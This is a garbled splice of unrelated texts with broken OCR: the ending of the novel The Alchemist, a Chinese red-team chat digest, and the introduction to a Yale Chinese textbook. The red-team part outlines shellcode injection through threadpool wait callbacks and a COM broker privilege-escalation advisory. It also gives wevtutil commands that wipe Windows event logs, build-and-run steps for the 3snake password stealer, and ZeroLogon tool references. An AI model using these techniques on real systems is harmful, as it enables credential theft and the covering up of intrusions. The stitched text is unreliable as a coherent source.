because he\nhad heard what the alchemist said to\nthe monk.\n\n\"And this is for me,\" said the\nalchemist, keeping one of the parts.\n\"Because I have to return to the desert,\nwhere there are tribal wars.\"\n\nHe took the fourth part and handed it to\nthe monk.\n\n\"This is for the boy. If he ever needs\nit.”\n\n\"But I'm going in search of my\ntreasure,\" the boy said. \"I'm very close\nto it now.\"\n\n\"And I'm certain you'll find it,\" the\nalchemist said.\n\n\"Then why this?\"\n\n\"Because you have already lost your\nsavings twice. Once to the thief, and\nonce to the general. I'm an old,\nsuperstitious Arab, and I believe in our\nproverbs. There's one that says,\n‘Everything that happens once can\nnever happen again. But everything\nthat happens twice will surely happen a\nthird time.' \" They mounted their\nhorses.\n\n\"I want to tell you a story about\ndreams,\" said the alchemist.\n\nThe boy brought his horse closer.\n\n\"In ancient Rome, at the time of\nEmperor Tiberius, there lived a good\nman who had two sons. One was in the\nmilitary, and had been sent to the most\ndistant regions of the empire.\nThe other son was a poet, and delighted\nall of Rome with his beautiful verses.\n\n\"One night, the father had a dream. An\nangel appeared to him, and told him\nthat the words of one of his sons would\nbe learned and repeated throughout the\nworld for all generations to come. The\nfather woke from his dream grateful\nand crying, because life was generous,\nand had revealed to him something any\nfather would be proud to know.\n\n\"Shortly thereafter, the father died as\nhe tried to save a child who was about\nto be crushed by the wheels of a\nchariot. Since he had lived his entire\nlife in a manner that was correct and\nfair, he went directly to heaven, where\nhe met the angel that had appeared in\nhis dream.\n\n\"You were always a good man,' the\nangel said to him. \"You lived your life\nin a loving way, and died with dignity.\nI can now grant you any wish you\ndesire.'\n\n\"Life was good to me,' the man said.\n\"When you appeared in my dream, I felt\nthat all my efforts had been rewarded,\nbecause my son's poems will be read\nby men for generations to come. I don't\nwant anything for myself. But any\nfather would be proud of the fame\nachieved by one whom he had cared for\nas a child, and educated as he grew up.\n\nSometime in the distant future, I would\nlike to see my son's words.'\n\n\"The angel touched the man's shoulder,\nand they were both projected far into\nthe future.\n\nThey were in an immense setting,\nsurrounded by thousands of people\nspeaking a strange language.\n\n\"The man wept with happiness.\n\n\"'T knew that my son's poems were\nimmortal,’ he said to the angel through\nhis tears. 'Can you please tell me which\nof my son's poems these people are\nrepeating >\"\n\n\"The angel came closer to the man,\nand, with tenderness, led him to a\nbench nearby, where they sat down.\n\n\"The verses of your son who was the\npoet were very popular in Rome,' the\nangel said.\n\n‘Everyone loved them and enjoyed\nthem. But when the reign of Tiberius\nended, his poems were forgotten. The\nwords you're hearing now are those of\nyour son in the military.'\n\n\"The man looked at the angel in\nsurprise.\n\"Your son went to serve at a distant\nplace, and became a centurion. He was\njust and good. One afternoon, one of\nhis servants fell ill, and it appeared that\nhe would die. Your son had heard of a\nrabbi who was able to cure illnesses,\nand he rode out for days and days in\nsearch of this man. Along the way, he\nlearned that the man he was seeking\nwas the Son of God. He met others who\nhad been cured by him, and they\ninstructed your son in the man's\nteachings. And so, despite the fact that\nhe was a Roman centurion, he\nconverted to their faith. Shortly\nthereafter, he reached the place where\nthe man he was looking for was\nvisiting.’\n\"'He told the man that one of his\nservants was gravely ill, and the rabbi\nmade ready to go to his house with\nhim. But the centurion was a man of\nfaith, and, looking into the eyes of the\nrabbi, he knew that he was surely in the\npresence of the Son of God.'\n\n\"And this is what your son said,' the\nangel told the man. “These are the\nwords he said to the rabbi at that point,\nand they have never been forgotten:\n\"My Lord, I am not worthy that you\nshould come under my roof. But only\nspeak a word and my servant will be\nhealed.\" “\n\nThe alchemist said, \"No matter what he\ndoes, every person on earth plays a\ncentral role in the history of the world.\nAnd normally he doesn't know it.\"\n\nThe boy smiled. He had never\nimagined that questions about life\nwould be of such importance to a\nshepherd.\n\n\"Good-bye,\" the alchemist said.\n\"Good-bye,\" said the boy.\n\n水\n\nThe boy rode along through the desert\nfor several hours, listening avidly to\nwhat his heart had to say. It was his\nheart that would tell him where his\ntreasure was hidden.\n\n\"Where your treasure is, there also will\nbe your heart,\" the alchemist had told\nhim.\n\nBut his heart was speaking of other\nthings. With pride, it told the story of a\nshepherd who had left his flock to\nfollow a dream he had on two different\noccasions. It told of destiny, and of the\nmany men who had wandered in search\nof distant lands or beautiful women,\nconfronting the people of their times\nwith their preconceived notions. It\nspoke of journeys, discoveries, books,\nand change.\n\nAs he was about to climb yet another\ndune, his heart whispered, \"Be aware of\nthe place where you are brought to\ntears. That's where I am, and that's\nwhere your treasure is.”\n\nThe boy climbed the dune slowly. A\nfull moon rose again in the starry sky:\nit had been a month since he had set\nforth from the oasis. The moonlight\ncast shadows through the dunes,\ncreating the appearance of a rolling\nsea; it reminded the boy of the day\nwhen that horse had reared in the\ndesert, and he had come to know the\nalchemist. And the moon fell on the\ndesert's silence, and on a man's journey\nin search of treasure.\nWhen he reached the top of the dune,\nhis heart leapt. There, illuminated by\nthe light of the moon and the\nbrightness of the desert, stood the\nsolemn and majestic Pyramids of\n\nEgypt.\n\nThe boy fell to his knees and wept. He\nthanked God for making him believe in\nhis destiny, and for leading him to\nmeet a king, a merchant, an\nEnglishman, and an alchemist. And\nabove all for his having met a woman\nof the desert who had told him that\nlove would never keep a man from his\ndestiny.\n\nIf he wanted to, he could now return to\nthe oasis, go back to Fatima, and live\nhis life as a simple shepherd. After all,\nthe alchemist continued to live in the\ndesert, even though he understood the\nLanguage of the World, and knew how\nto transform lead into gold. He didn't\nneed to demonstrate his science and art\nto anyone. The boy told himself that,\non the way toward realizing his own\ndestiny, he had learned all he needed to\nknow, and had experienced everything\nhe might have dreamed of.\n\nBut here he was, at the point of finding\nhis treasure, and he reminded himself\nthat no project is completed until its\nobjective has been achieved. The boy\nlooked at the sands around him, and\nsaw that, where his tears had fallen, a\nscarab beetle was scuttling through the\nsand. During his time in the desert, he\nhad learned that, in Egypt, the scarab\nbeetles are a symbol of God.\n\nAnother omen! The boy began to dig\ninto the dune. As he did so, he thought\nof what the crystal merchant had once\nsaid: that anyone could build a pyramid\nin his backyard. The boy could see now\nthat he couldn't do so if he placed stone\nupon stone for the rest of his life.\n\nThroughout the night, the boy dug at\nthe place he had chosen, but found\nnothing. He felt weighted down by the\ncenturies of time since the Pyramids\nhad been built. But he didn't stop. He\nstruggled to continue digging as he\nfought the wind, which often blew the\nsand back into the excavation. His\nhands were abraded and exhausted, but\nhe listened to his heart. It had told him\nto dig where his tears fell.\n\nAs he was attempting to pull out the\nrocks he encountered, he heard\nfootsteps. Several figures approached\nhim. Their backs were to the\nmoonlight, and the boy could see\nneither their eyes nor their faces.\n\n\"What are you doing here?\" one of the\nfigures demanded.\n\nBecause he was terrified, the boy didn't\nanswer. He had found where his\ntreasure was, and was frightened at\nwhat might happen.\n\n\"We're refugees from the tribal wars,\nand we need money,\" the other figure\nsaid. \"What are you hiding there?\"\n\n\"I'm not hiding anything,\" the boy\nanswered.\n\nBut one of them seized the boy and\nyanked him back out of the hole.\nAnother, who was searching the boy's\nbags, found the piece of gold.\n\n\"There's gold here,” he said.\n\nThe moon shone on the face of the\nArab who had seized him, and in the\nman's eyes the boy saw death.\n\n\"He's probably got more gold hidden in\nthe ground.\"\n\nThey made the boy continue digging,\nbut he found nothing. As the sun rose,\nthe men began to beat the boy. He was\nbruised and bleeding, his clothing was\ntorn to shreds, and he felt that death\nwas Near.\n\n\"What good is money to you if you're\ngoing to die? It's not often that money\ncan save someone's life,\" the alchemist\nhad said. Finally, the boy screamed at\nthe men, \"I'm digging for treasure!\"\nAnd, although his mouth was bleeding\nand swollen, he told his attackers that\nhe had twice dreamed of a treasure\nhidden near the Pyramids of Egypt.\n\nThe man who appeared to be the leader\nof the group spoke to one of the others:\n\"Leave him. He doesn't have anything\nelse. He must have stolen this gold.\"\n\nThe boy fell to the sand, nearly\nunconscious. The leader shook him and\nsaid, \"We're leaving.\"\n\nBut before they left, he came back to\nthe boy and said, \"You're not going to\ndie. You'll live, and you'll learn that a\nman shouldn't be so stupid. Two years\nago, right here on this spot, I hada\nrecurrent dream, too. I dreamed that I\nshould travel to the fields of Spain and\nlook for a ruined church where\nshepherds and their sheep slept. In my\ndream, there was a sycamore growing\nout of the ruins of the sacristy, and I\nwas told that, if I dug at the roots of the\nsycamore, I would find a hidden\ntreasure. But I'm not so stupid as to\ncross an entire desert just because of a\nrecurrent dream.”\n\nAnd they disappeared.\n\nThe boy stood up shakily, and looked\nonce more at the Pyramids. They\nseemed to laugh at him, and he laughed\nback, his heart bursting with joy.\n\nBecause now he knew where his\ntreasure was.\nEPILOGUE\n\nThe boy reached the small, abandoned\nchurch just as night was falling. The\nsycamore was still there in the sacristy,\nand the stars could still be seen through\nthe half-destroyed roof. He\nremembered the time he had been there\nwith his sheep; it had been a peaceful\nnight... except for the dream.\n\nNow he was here not with his flock, but\nwith a shovel.\n\nHe sat looking at the sky for a long\ntime. Then he took from his knapsack a\nbottle of wine, and drank some. He\nremembered the night in the desert\nwhen he had sat with the alchemist, as\nthey looked at the stars and drank wine\ntogether. He thought of the many roads\nhe had traveled, and of the strange way\nGod had chosen to show him his\ntreasure. If he hadn't believed in the\nsignificance of recurrent dreams, he\nwould not have met the Gypsy woman,\nthe king, the thief, or... \"Well, it's a\nlong list. But the path was written in\nthe omens, and there was no way I\ncould go wrong,\" he said to himself.\n\nHe fell asleep, and when he awoke the\nsun was already high. He began to dig\nat the base of the sycamore.\n\n\"You old sorcerer,\" the boy shouted up\nto the sky. \"You knew the whole story.\nYou even left a bit of gold at the\nmonastery so I could get back to this\nchurch. The monk laughed when he\nsaw me come back in tatters. Couldn't\nyou have saved me from that?\"\n\n\"No,\" he heard a voice on the wind say.\n\"If I had told you, you wouldn't have\nseen the Pyramids. They're beautiful,\naren't they?”\n\nThe boy smiled, and continued digging.\nHalf an hour later, his shovel hit\nsomething solid.\n\nAn hour later, he had before him a\nchest of Spanish gold coins. There were\nalso precious stones, gold masks\nadored with red and white feathers,\nand stone statues embedded with\njewels. The spoils of a conquest that\nthe country had long ago forgotten, and\nthat some conquistador had failed to\ntell his children about.\n\nThe boy took out Urim and Thummim\nfrom his bag. He had used the two\nstones only once, one morning when he\nwas at a marketplace. His life and his\npath had always provided him with\nenough omens.\n\nHe placed Urim and Thummim in the\nchest. They were also a part of his new\ntreasure, because they were a reminder\nof the old king, whom he would never\nsee again.\n\nIt's true; life really is generous to those\nwho pursue their destiny, the boy\nthought. Then he remembered that he\nhad to get to Tarifa so he could give\none-tenth of his treasure to the Gypsy\nwoman, as he had promised. Those\nGypsies are really smart, he thought.\n\nMaybe it was because they moved\naround so much.\n\nThe wind began to blow again. It was\nthe levanter, the wind that came from\nAfrica. It didn't bring with it the smell\nof the desert, nor the threat of Moorish\ninvasion. Instead, it brought the scent\nof a perfume he knew well, and the\ntouch of a kiss—a kiss that came from\nfar away, slowly, slowly, until it rested\non his lips.\n\nThe boy smiled. It was the first time\nshe had done that.\n\n\"I'm coming, Fatima,\" he said.\n"

Generates and hosts EXE at URL.\n+ Added [note] field to logs to call out note changes made to session\n\n+ Added scriptable popup hook for ‘listeners' (View -> Listeners table)\n\n+ Added \"*\" meta-column to table Ctrl+F feature.

CreateEvent is used to create an event object witha Signaled state\n\n2. RWX memory for the shellcode is allocated with virtualAlloc and the shellcode is written there\n\n3. CreateThreadpoolWait is used to create a wait object. 1st argument of the function is a callback\nfunction, that will be called once the wait ends (immediately in our case, since our waitable event is in\nthe Signaled state from the start). We will pass the address of our shellcode (allocated in step 2)\nas the callback function\n\n4. SetThreadpoolWait is used to set wait object to the wait object created in step 3\n\n5.

This is a generic COM broker to\nserve classes running at SYSTEM to users for the purposes of configuring things like 0086 and the Retail Demo.\n\nInitself this wouldn t be an issue as long as the scheduled task and COM servers are appropriately ACL’ ed. Unfortunately they’ re not. The scheduled\ntask can be started by a normal user, and the COM server (f7fa3149-91e7-43b7-8040-b707688ced1a) doesn’ t specify a restrictive Launch Permission in its\nAppID (f7fa3149-91e7-43b7-8040-b707688ced 1a) so the default is used which grants the INTERACTIVE group access.\n\nNormally while INTERACTIVE would be able to create a new instance the default Access Permissions would only grant Administrators and the SELF SID\n(which would be SYSTEM) access, However, whether a bug or by design when the CloundExperienceHostBroker process calls ColnitializeSecurity it uses a\ndifferent AppID (efe2d6d8-a8 1b-41e7-ae77-e5244ab80522) which grants INTERACTIVE access as well. The end result is a normal unprivileged user can\nlaunch the COM server through the Scheduled Task. activate a new instance and access the resulting COM server.\n\nAgain this wouldn’ t be a problem as long as the COM server doesn’ t do anything dangerous. The COM server vends the generic ICreateObject interface\nwhich allows a user to pass a CLSID to create. The broker will only create classes which are registered in\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CloudExperienceHost\\Broker\\ElevatedClsids which is the following on Windows 10\n1909.\n\n031 6bbc2-92d9-4e2e-8345-3609¢6b5c167 CloudExperienceHost Diagnostics Elevated Manager\n\n06dc6740-fd0d-426a-9bf6-20ddbd7d53ce\nOb26fe8c-9e57-48ff-ad9f-3084ef402443 ProvOperationsCleanContext\n\nWing: 我 以 为 我 复 现 失 败 了 , 报 错 。 为 商 是 宋 冬\n\nL: 不 知 道 , 好 像 那 个 接 口 创 建 的 用 户 就 叫 这 个 [ 捍 脸 ]\n\nWing: 醉 了 。 我 以 为 我 那 台 虚 拟 机 本 来 就 存 在 一 个 叫 宋 冬 的 用 户 。\nlengyi: exp 开 发 中 。\n\nRedTeaming - 2020-09-09\n\n# 皂 网 混 透 技 巧 #\nWindows+ 入 侵 痕 迹 清 理 技 巧\n\nL: wevtutil 清 除 也 是 可 以 的 <br>wevtutil cl System<br>wevtuttl cl Application<br>wevtuttl cl Security<br>wevtutil cl Setup\n\nRedTeaming - 2020-09-10\n\n反 转 字 符 串 绕 权 软\n\nRedTeaming - 2020-09-12\n\n微 软 Exchange Server 远 程 代 码 执 行 (CVE-2020-16875)\n\n检 测 是 否 存 在 涛 泉 :\nGitHub+-+dpaulson45/HealthChecker+Exchange+Server.、\n\n检 测 思 路 ( 日 志 ) :\nEvents ID 25552 (New-DlpPolicy)\nExchange+Admin+Audit+Log+Event+ID+25552+-+New-DIpP..\n\nEvent ID 25546 (mport-DipPolioyTemplate)\nExchange+Admin+Audit+Log+Event+ID+25546+-+Import-D...\nhttps://twitter.com/TomSellers/status/130412597100...\n\n技 术 分 析 :\nAttackerKB+|+CVE-2020-16875\n\nRedTeaming - 2020-09-13\n\nHee\nESA\n\n安 恒 安 全 运 营 中 心 威 股 情 报 总 结 +DAY1\n\nRedTeaming - 2020-09-16\n\n# 湘 泡 复 现 4\nCVE-2020-1472 复 现 : CVE-2020-1472 复 现 +|+ 九 世 的 博 客\n\nWing: 猕 猴 桃 已 经 支 持 了\n\nRedTeaming - 2020-09-16\n\n# 湘 泡 复 现 4\nCVE-2020-1472 复 现 : CVE-2020-1472 复 现 +|+ 九 世 的 博 客\n\nWing: 猕 猴 桃 已 经 支 持 了\n\nRedTeaming - 2020-09-16\n\n# 内 网 溥 泠 利 用 #\nCS 版 本 的 CVE-2020-1472\n\nnccfsas/Tools/SharpZeroLogon+at+main+-+nccgroup/nc...\n\nnccfsas/Tools/SharpZeroLogon+at+main+-+nccgroup/nc...\n\nTony: 看 到 cs 版 本 的 , 下 意 识 以 为 是 cobalt strike 插 件 , 打 开 一 下 是 ‏ہم‎\n‎Wing: execute-assembly\n\nRedTeaming - 2020-09-17\nE\n\n记 一 次 小 溯 源 +-+ 先 知 社 区\n\nRedTeaming - 2020-09-17\n高 谱 !\n\nC404+Indictment+Reduced+Size\nWing: @484 的 菜 鸡 徒 弟\n\nRedTeaming - 2020-09-17\n\nQuestion:\n\n有 没 有 二 开 cobaltstrike 的 资 料 ? 丢 点\n\nAnswer:\n\n还 没 下 班 吱 , 日 后 再 说 。 旺 柯\n\nRedTeaming - 2020-09-18\n\nQuestion:\n\n想 问 师 傅 们 对 于 C2 和 MSF 如 何 学 习 才 是 最 好 的 方 式\n\n还 有 很 多 东 西 是 否 要 钻 牛 角 尖 深 究 它 的 原 理\n\nwe\n\nYRRK, BREAAA, 8532101-600\n\nAnswer:\n\nC2 和 msf 的 学 习 : 本 地 手 动 搭 建 一 个 域 环 境 , 设 置 三 层 内 网 。 至 少 先 保 证 能 够 使 用 他 们 打 到 最 后 一 层 ( 垦 接 )\n关 于 免 杀 ; 高 级 免 杀 我 还 在 学 习 , 基 础 的 就 去 nedteam 学 习 。\n\n我 觉 得 吧 , 任 何 人 的 回 答 都 没 啶 用 , 多 琪 磨 , 带 着 有 用 的 问 题 去 讨 论 , 提 问 。\n\nRedTeaming - 2020-09-23\n\n使 用 yara 防 御 恶 意 软 件\n\nRedTeaming - 2020-09-24\n\n8 网 湾 通 技 左 #\n\nShiro+ 组 件 安 全 概 览\n\nRedTeaming - 2020-09-25\n\nہب\n‎团 队 协 同 作 战 才 能 所 向 拔 靡‏\n红 蓝 攻 防 实 战 演 习 复 盘 总 结 ( 附 脑 图 下 载 地 址 )\nRedTeaming - 2020-09-26\n\n红 队 隐 藏 技 巧\n\n红 队 隐 藏 技 巧 +-+ 裤 祝 哥 的 小 屋\nRedTeaming - 2020-09-27\n\n朱-inux 权 限 维 持 #\nSnake 窃 取 密 码\nLinux 权 限 维 持\n\nSnake 窃 取 密 码\n\nhttps://github.com/blendin/3snake\n\nmake\n./3nake\n\npassword:\n\nease try again.\npassword: 【\n\n监 听 获 得 密 码\n\nRedTeaming - 2020-09-27\n\n#C2#\n这 个 实 战 中 还 没 用 过 , 用 过 的 合 学 可 以 反 馈 下 效 果 咙 桦 。Linux 版 本 的 C2 Go 语 言 写 的 开 源 的 有 好 几 个 了 。 核 心 功 能 就 是 要 支 持 95/http 代 理 , 大 家 可 以 尝 试 用 一 下 blueshel 和 DeimosC2 。\n\n热 门 极 造 下 载 /CrossC2\n\nlengyi: 这 个 支 持 mac, 安 卓 , 新 加 入 了 横 向 移 动\nHistory\n\nRedTeaming - 2020-09-27\n\n根 [ 队 武 器 化 研 发 #\n如 果 想 写 自 已 的 自 动 化 工 具 的 话 , 可 以 把 里 面 的 出 数 抽 离 出 来 用 , 老 夫 写 代 码 就 是 复 制 粘 贴 。\nEnvironment\n+ CurrentUser.cs - the current user\n.

The origins of this language and its position in the\nChinese-speaking world will be discussed below, in the section on linguistic\nbackground.\n\nVariation\n\nGiven the geographic spread of Mandarin across the Chinese-speaking world,\nand its function as a lingua franca co-existing with regional and local languages,\nit is not surprising that it demonstrates a broad range of variation in pronun-\nciation, word choice, grammar, and usage. Some speakers, by virtue of geo-\ngraphic origin or educational background, may claim to be arbiters of ‘good’\nand ‘bad’ Mandarin, particularly in matters of pronunciation, where the edu-\ncated speech of Beijing is generally considered to be standard. However, when\nit comes to the pronunciation of individual words, word choice, particular\nnuances of meaning, grammatical organization of sentences, or linguistic\nusage, Chinese displays a range of variation comparable to, or perhaps greater\nthan, that of English, and such variation is only likely to grow as contact with\nforeigners increases and the Chinese language spreads beyond the borders of\nChina.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nxxii INTRODUCTION\n\nLearning Chinese recognizes a standard sound system for Mandarin (as rep-\nresented in the pinyin system of romanization) but otherwise accepts a broad\nrange of usage, much of it conditioned by social or geographic factors. Where\nparticular usage can be labeled (as, for example, ‘Taiwan’ or ‘southern China’),\nit is. There may also be unlabeled linguistic material in Learning Chinese that\nis judged aberrant by teachers or other native speakers of the language. Such\njudgments should be noted, but they too may need to be revised as you continue\nto observe the language in its full richness, as it is actually spoken or written.\n\nThe audience\n\nThough students who already have some ability in Chinese will, in many cases,\nfind this course useful, it does not assume any prior background in the lan-\nguage. Learning Chinese is intended for a diverse audience, specialist and non-\nspecialist alike, who need a course that not only guides them toward basic\nconversational and literary skills but also stimulates their curiosity about the\nlinguistic setting of the language and the geography, history, and culture of the\nlands where it is spoken. Learning Chinese is intended to provide a solid foun-\ndation for further study of the language, whether in a specialized program of\nChinese studies or in conjunction with work or further study in a Chinese-\nspeaking environment.\n\nA foundation\n\nWhen you begin studying a language, a lot of time has to be spent familiarizing\nyourself with the ‘code’: the sounds, words, and organization of the language.\nThere comes a point, after a year or two of (non-intensive) study, when you\nhave acquired a critical mass of language material and, provided you remain\nobservant and responsive to feedback, can start to learn effectively from direct\ninteraction with native speakers. This is also the point at which the notion of\nimmersion begins to make sense, and when going abroad to study the language\nin a completely immersive setting offers the maximum benefit. This textbook\nis designed to get you to that point. With the additional materials recommended\nwithin, it covers approximately 200 class hours—a year and a half to two years\nin a regular course of study.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION xxiii\n\nSelf-instruction\n\nWith help from a Chinese speaker, particularly in the early stages of language\ndevelopment, Learning Chinese can also serve as a manual for self-instruction.\nIt introduces the language systematically; it has extensive explanations about\nusage, as well as suggestions about how to learn the material within; it provides\na pathway for the inductive learning of both conversational and literary skills;\nand it comes with a selection of audio files and other materials that can be\naccessed electronically.\n\nGoals summarized\n\nSuccinctly, the goals of Learning Chinese are: (a) a basic conversational compe-\ntence, which means mastery of pronunciation and familiarity with a repertoire\nof useful conversational situations, including some, involving language and\ncultural issues, that allow you as a learner to explore topics of interest; (b) an\nunderstanding of the reading process and the properties of the character writing\nsystem so that you can begin to develop a reading competence by way of edited\ntexts written in either the simplified or the traditional character set; (c) the\nability to represent speech with the pinyin system of transcription, to write a\nselection of characters from one of the standard character sets, and to use refer-\nence materials, word processing, or other forms of electronic communication\nto continue to independently build language competence; and (d) a basic famil-\n\niarity with those aspects of modern Chinese society and culture that specifically\nrelate to language use.\n\nReaching the goals\n\nYou study a foreign language in order to learn how to converse with people of\nanother culture, to read material written in the language of that culture, to be\nable to write the language down, to prepare spoken presentations, and, if you\nare very ambitious, to write letters, reports, or other forms of composition in\nthat language. How should you proceed effectively to reach those goals? What\nshould the focus of study be? The following is a brief attempt, in anticipation\nof a complete course of study, to answer these questions.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nxxiv INTRODUCTION\n\nA. CONVERSATIONAL SKILLS When learning a foreign language, the conversa-\ntional skills of listening and speaking are primary; the literary skills of reading\nand writing are secondary. In effect, conversational skills can be taught inde-\npendently of reading and writing, but the latter are most effectively taught with\nreference to spoken language.\n\nFor the oral skills of speaking and listening, the objective—learning how to\ninteract in context—is clear. If a colleague pokes his head in my office to ask,\nNimen you 541 ma? (literally: “You-all have umbrella question’), I can interpret\nhis request not as an inquiry about possessions—‘Do you own an umbrella?’—\nbut as a request to borrow an umbrella—‘Can you lend me an umbrella?’—\nbecause I know it’s raining and he’s going to meet his wife. So I respond,\nwithout much thought: You, pou, 7200 yong ma? ‘Sure, you want to use it?’\nAlmost before the words are out of my mouth, I realize—for various reasons\nthat involve the likelihood of his making such a request—that it is more likely\nhe’s asking if I need to borrow his umbrella: ‘Do you need an umbrella?’\nIndeed, this is the case, for he then clarifies: Bu, bu, ৮৮6 pa nimen méiydu ‘No,\nI was afraid you [all] didn’t have one.’\n\nThis example underscores the importance of situational context. Ultimately,\nit was context that led me to an interpretation of the speaker’s intentions. It\nwas also context that allowed me to figure out that “You-all have umbrella ques-\ntion’ meant ‘Do you need an umbrella?’ For the learner, the situational context\nis clearest during personal interactions; in other words, in conversation. Learn-\ning Chinese focuses on conversation from the start, with you, the learner, as a\nparticipant as much as possible. Conversation also involves instant feedback\nand a degree of overlapping content, so that listening skills support speaking\nand vice versa.\n\nIn Learning Chinese, content is organized into units of a dozen or more topics,\neach of which takes several weeks to complete. You will proceed as if on a\nguided tour, being introduced to relevant material, practicing short interac-\ntions, proceeding in overlapping waves, and culminating in one or more exten-\nsive dialogues that knit the various parts of the unit into a cohesive whole. This\napproach makes it possible to introduce a wealth of interconnected material\nthat can form the basis of engaging conversations and interesting narratives.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION XXV\n\nFor example, Unit 4 presents (among other things) time phrases, names and\ntitles, introductions, and subjects of study. These can be practiced piecemeal\nduring introductory classes; later, they are woven into a dialogue involving a\nChinese businessman striking up a conversation with an overseas student\n(such as yourself) on a bus in Sichuan province. Within each lesson, topics are\nselected so you can build up a conversational repertoire that can be personal-\nized, practiced, and extended from lesson to lesson.\n\nB. READING AND CHARACTERS During conversation, you are trying to apprehend\nthe intentions of the speaker; so, too, in reading, you are trying to interpret the\nintentions of the author, who had to imagine an audience and transform the\nlanguage into written code. In English, the written code is based on letters and\nvarious grammatical conventions; in Chinese, it is based on characters and a\ndifferent set of grammatical conventions.\n\nFor the literate, reading Chinese feels like a seamless process of extracting\nmeaning from text: characters evoke words (or parts of words) and words\nevoke images that blend into meanings. However, when you are learning\nto read a language like Chinese, the reading process tends to resolve itself\ninto two phases: recognizing the characters (which is actually a process\nof matching ‘single-syllable’ characters to what are often polysyllabic\nwords) and then reading for comprehension. Because learning to recognize\ncharacters is so difficult, the problems of comprehension (over and above\nbasic recognition of characters) sometimes receive less attention than\nthey deserve.\n\nThe character units in Learning Chinese are intended to address both issues.\nTo ease the burden of learning to recognize characters, the texts are composed\nof words and grammatical patterns that are familiar from the core units; the\ntexts are also composed so that new characters appear with enough frequency,\nand in a sufficient range of contexts, to make it possible to retain and recall\nthem through the process of reading alone. In addition, to ensure that reading\nproceeds smoothly from character recognition to comprehension, most of the\nreadings are embedded in question-and-answer or comment-and-response\nformats that provide clear contexts for understanding.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nxxvi INTRODUCTION\n\nThe goal of the reading instruction in Learning Chinese is to foster an under-\nstanding of the reading process and develop basic reading skills in students\nwith little or no prior experience in Chinese so that they may make the transi-\ntion to graded reading materials already in print, beginning with such well-\ntested classics as The Lady in the Painting and Strange Tales in a Chinese Studio\n(both published by Yale University Press).\n\nC. COMPOSITION Of the four essential language skills—listening, speaking,\nreading, and writing—the last (better called ‘composition’) is the most elusive,\nand after years of schooling, even native speakers often find written expression\ndifficult. The problem stems from the lack of the sort of feedback that guides\nface-to-face interaction; not just linguistic features like stress and intonation,\nbut facial expressions, gestural movements, and the physical context of the\ninteraction, all of which help to monitor the communicative event. However,\nbecause writing persists, the good writer learns to tailor it to an imagined audi-\nence, providing more redundancy in the form of complete sentences, precise\nusage, and elaboration. This careful tailoring often depends on language intu-\nition that only native speakers possess, and even the most fluent speakers of a\nlearned language usually depend on native speakers to verify the accuracy of\nwritten work.\n\nWhile learning to write well enough to serve even basic needs of written\ncommunication is a skill best left to higher levels of language learning, when\nconversational and reading skills are more advanced, composition can serve a\nuseful purpose even at foundation levels. Because it is a productive skill, like\nspeaking, composition can help with vocabulary growth, usage, grammar, and\ncohesion. In later units, Learning Chinese occasionally makes use of ‘guided\ncompositions’, in which an outline of the content is given and the task is to\nincorporate it into a written text. Teachers may wish to add other written assign-\nments, in the form of diary entries, biographical sketches, or personal letters\n(such as the one that appears in Unit 7).\n\nRomanization versus characters\n\nEven though written Chinese is generally a style of its own, rather different\nfrom spoken language, it is obviously possible to write out conversations and\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nINTRODUCTION XXxvii\n\nother spoken material using characters. Dramatic plays and the dialogue sec-\nions of novels and language textbooks are among the genres that record\nspoken language in this way. However, as you know, while the Chinese script\nis an efficient and aesthetically pleasing writing system for native speakers of\nhe language, it has disadvantages for learners who need a way of representing\npronunciation and keeping track of language material during the learning\nprocess. Learning Chinese separates the study of the language in general from\nhe study of characters in particular. Conversational material is presented in\nhe standard, phonetically based notation of the Chinese-speaking world, called\nHanyu Pinyin, ‘spelling the sounds of Chinese’. Utilizing Hanyu Pinyin for\nhe core units ensures that the learning of spoken material is not conditioned\nby factors related to character acquisition; in effect, it means that dialogues and\nother spoken material can be more natural and extensive than would be pos-\nsible if all the characters that represent them had to be learned at the same\n\nime.\n\nBecause Learning Chinese separates character reading (and writing) from\nother aspects of language learning, students who wish to study or review the\nspoken language without reference to characters can ignore, or postpone, the\ncharacter units, while those with sufficient vocabulary and grammatical knowl-\nedge can alternatively study the character material alone.\n\nWriting of characters\n\nWhile learning to write, or reproduce characters, does help with recognition\n(and so, ultimately, with reading), it is not the case that you need to be able to\nwrite all characters from memory in order to be able to read them. A hint or\ntwo—the ‘heart’ sign in one character, a ‘phonetic’ element in another—will\noften be enough for the expectations arising from context to be confirmed. In\nrecognition of this, the character material in Learning Chinese is organized\nprimarily to develop reading skills. Information on how to write the graphs is\nincluded to draw attention to the general structure of characters, as well as to\nfacilitate their reproduction. It is certainly useful to learn to write from memory\na few hundred of the more common characters in order to absorb the general\nprinciples of character construction. It is also useful to be able to write personal\ninformation in characters so that you can sign in and sign out, fill out forms,\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nxxviii INTRODUCTION\n\nand jot down your contact information. Otherwise, like most Chinese them-\nselves nowadays, the bulk of your writing will make use of Chinese language\nword processing, which involves selecting from a set of character options—in\nother words, character recognition, not production. Thus, Learning Chinese\ntakes the position that learning to write characters from memory is not a\nprimary goal at foundation levels.\n\nThe simplified and traditional character sets\n\nWithout the requirement that characters be written from memory, the exis-\ntence of two sets of Chinese characters (the simplified set used on the Mainland\nand in Singapore, and the traditional set associated with Taiwan and many\noverseas communities) becomes much less problematical. Both sets can be\nintroduced simultaneously. Students note the relationship between the two\nforms, learn to read both in context (though Learning Chinese places more\nemphasis on the simplified set), and select one to write. We recommend fol-\nlowing the Mainland majority and learning to write the simplified set, which\nis generally based on well-established written variants. Individuals are free to\nchoose, but should be aware that while formal examinations tend to offer ver-\nsions of both, Mainland study programs expect their students to be able to read\nsimplified characters.\n\nFrom textbook to classroom\n\nThe selection and ordering of topics in Learning Chinese is based on my own\nexperience learning and teaching Chinese over several decades. It is guided by\nwhat the beginning student is likely to encounter in and out of the classroom\nsetting, as well as by the need to provide a broad foundation of grammatical,\nlexical, and cultural information for future work in Chinese. It mixes practical\ntopics, such as providing biographical information, buying train tickets, or\ngiving toasts, with topics of general interest, such as geography, regional 